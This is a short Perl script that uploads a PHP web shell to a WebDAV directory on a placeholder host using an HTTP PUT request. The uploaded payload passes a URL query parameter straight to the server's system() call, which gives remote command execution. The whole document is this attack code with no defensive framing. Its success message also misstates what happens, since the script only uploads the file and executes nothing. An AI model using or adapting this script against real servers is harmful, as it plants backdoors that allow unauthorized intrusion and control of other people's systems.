#!/usr/bin/perl

use strict;
use warnings;

use LWP::UserAgent;

my $ua = LWP::UserAgent->new;
my $url = 'http://target.server.com/webdav/';
my $body = '<?php system($_GET[\'cmd\']); ?>';
my $headers = HTTP::Headers->new(
    'Content-Type' => 'text/plain',
    'Content-Length' => length($body)
);
my $req = HTTP::Request->new('PUT', $url, $headers, $body);
my $res = $ua->request($req);

if ($res->is_success) {
    print "Command executed successfully\n";
}
else {
    print "Error: " . $res->status_line . "\n";
}

